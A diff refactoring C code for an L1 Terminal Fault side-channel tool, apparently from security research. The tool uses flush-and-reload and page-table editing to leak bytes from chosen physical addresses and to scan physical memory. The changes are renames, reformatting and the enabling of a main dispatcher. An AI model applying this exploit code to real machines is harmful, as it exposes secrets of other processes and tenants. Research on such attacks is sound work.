@@ -4,6 +4,7 @@
 #include "flush_and_reload.h"
 #include <asm-generic/errno-base.h>
 #include <bits/types/siginfo_t.h>
+#include <err.h>
 #include <errno.h>
 #include <getopt.h>
 #include <stdbool.h>
@@ -15,7 +16,6 @@
 #include <sys/utsname.h>
 #include <ucontext.h>
 #include <unistd.h>
-#include <err.h>
 
 #pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wunused-function"
@@ -266,7 +266,7 @@ void escape_ascii(char in, char out[3]) {
   }
 }
 
-void do_leak(const uintptr_t phys_addr, const size_t length) {
+void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
@@ -278,7 +278,7 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   leak_addr_t leak = l1tf_leak_buffer_create();
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
 
-  fprintf(stderr, "Clear the reload buffer at %p\n", (void*)reload_buffer);
+  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
   const size_t results_size = length * sizeof(uint8_t);
@@ -370,7 +370,7 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
   return NULL;
 }
 
-void do_leak_bitwise(const uintptr_t phys_addr, const size_t length) {
+void l1tf_do_leak_bitwise(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
@@ -382,7 +382,7 @@ void do_leak_bitwise(const uintptr_t phys_addr, const size_t length) {
   leak_addr_t leak = l1tf_leak_buffer_create();
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
 
-  fprintf(stderr, "Clear the reload buffer at %p\n", (void*)reload_buffer);
+  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
   const size_t results_size = length * sizeof(uint8_t);
@@ -418,7 +418,7 @@ void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]
 }
 
 // If you already know a physical address that you want to leak
-int main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, size_t)) {
+int l1tf_main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, size_t)) {
   // Parse the physcial address and the length from the
   // command line arguments
   uintptr_t phys_addr = -1;
@@ -489,15 +489,14 @@ void *l1tf_spawn_leak_page(void) {
     err(EXIT_FAILURE, "Failed to resize shared memory");
   }
 
-  void *leak_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
-                         MAP_SHARED | MAP_POPULATE, fd, 0);
+  void *leak_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
   if (leak_page == (void *)-1) {
     err(errno, "mmap of leak page failed");
   }
   return leak_page;
 }
 
-int main_scan(const int argc, char *argv[argc]) {
+int l1tf_main_scan(const int argc, char *argv[argc]) {
   uintptr_t start_addr = -1;
   size_t stride = getpagesize();
   size_t length = -1;
@@ -575,25 +574,25 @@ int main_scan(const int argc, char *argv[argc]) {
   return 0;
 }
 
-// int main(int argc, char *argv[argc]) {
-//   assert(argc > 0);
-//
-//   if (argc >= 2) {
-//     if (!strcmp("leak", argv[1])) {
-//       return main_leak(argc, argv, do_leak);
-//     } else if (!strcmp("leak_bitwise", argv[1])) {
-//       return main_leak(argc, argv, do_leak_bitwise);
-//     } else if (!strcmp("scan", argv[1])) {
-//       return main_scan(argc, argv);
-//     }
-//   }
-//
-//   char *name = argv[0];
-//   fprintf(stderr,
-//           "Usage\n"
-//           "\t%s leak\n"
-//           "\t%s leak_bitwise\n"
-//           "\t%s scan\n",
-//           name, name, name);
-//   exit(1);
-// }
+int l1tf_main(int argc, char *argv[argc]) {
+  assert(argc > 0);
+
+  if (argc >= 2) {
+    if (!strcmp("leak", argv[1])) {
+      return l1tf_main_leak(argc, argv, l1tf_do_leak);
+    } else if (!strcmp("leak_bitwise", argv[1])) {
+      return l1tf_main_leak(argc, argv, l1tf_do_leak_bitwise);
+    } else if (!strcmp("scan", argv[1])) {
+      return l1tf_main_scan(argc, argv);
+    }
+  }
+
+  char *name = argv[0];
+  fprintf(stderr,
+          "Usage\n"
+          "\t%s leak\n"
+          "\t%s leak_bitwise\n"
+          "\t%s scan\n",
+          name, name, name);
+  exit(1);
+}
